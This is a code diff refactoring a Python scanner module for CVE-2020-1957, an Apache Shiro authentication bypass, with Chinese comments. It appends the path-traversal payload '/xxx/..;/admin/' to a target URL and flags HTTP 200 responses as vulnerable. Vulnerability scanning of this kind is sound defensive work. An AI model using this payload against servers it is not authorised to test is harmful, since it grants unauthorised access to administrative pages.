@@ -1,40 +1,42 @@
-import requests
-import re
-from lib import config
+from pocs import scanner
+import pocs
 
-class POC:
-    #PoC信息字段，需要完整填写全部下列信息
-    pocName='scanner/shiro/CVE-2020-1957'
-    version = '1'               #PoC版本，默认为1
-    author = 'haochen'          #此PoC作者
-    vulNum = 'CVE-2020-1957'    #漏洞编号
-    vulDate = '2014-11-03'      #漏洞公开日期
-    createDate = '2020-01-13'   #编写PoC日期
-    updateDate = '2020-01-13'      #更新PoC日期，默认与createDate一样
-    name = 'shiro 未授权访问漏洞'#PoC名称
-    appName = 'shiro'#漏洞应用名称
-    appVersion = '12'#漏洞影响版本
-    vulType = '未授权访问'#漏洞类型
-    desc = '''可以绕过登陆界面，直接进入网站后台'''#在漏洞描述填写
-    install_requires = []#PoC依赖的第三方模块，尽量不要使用第三方模块，必要时参考后面给出的参考链接
-    pocDesc = '''通过访问http://127.0.0.1:8080/xxx/..;/admin/可绕过登陆界面，直接访问网站后台'''#在PoC用法描述填写
+class POC(scanner.Pocs):
 
-    def scanner(url):
-        target = url
-        head = config.Pack
-        payload = '/xxx/..;/admin/'
-        if re.match('/$',url):
+    def __init__(self):
+        '''
+            初始化函数
+        '''
+        super().__init__()
+        self.poc_name='shiro 未授权访问漏洞'
+        self.poc_pwd='pocs/scanner/shiro/CVE_2020_1957.py'
+        self.vul_name='shiro 未授权访问漏洞'
+        self.vul_num='CVE-2020-1957'
+        self.app_name='shiro'
+        self.app_version='12.x'
+        self.author='haochen'
+        self.msg='直接访问管理页面/admin/会被重定向至登陆页面，访问/xxx/..;/admin/可绕过登陆直接进入后台'
+
+    def scanner(self,target):
+        '''
+            扫描使用的函数
+        '''
+        url = target
+        self.att_msg['target'] = target
+        head = pocs.Pack
+        self.att_msg['payload']='/xxx/..;/admin/'
+        if pocs.re.match('/$',url):
             url=url[0:len(url)-1]
-        url = url + payload
+        target = url + self.att_msg['payload']
         try:
-            response = requests.get(url,headers=head)
+            response = pocs.requests.get(target,headers=head)
             if response.status_code == 200:
-                print(target+' have this loop')
+                self.att_msg['status']='success'
             else:
-                print(target+' do not have this loop')
+                self.att_msg['status']='failed'
         except:
-            print(target+' is error')
-       
-
-    def attack():
-        return 0
+            self.att_msg['status']='error'
+        self.__cout()
+    
+    def __cout(self):
+        super().cout()
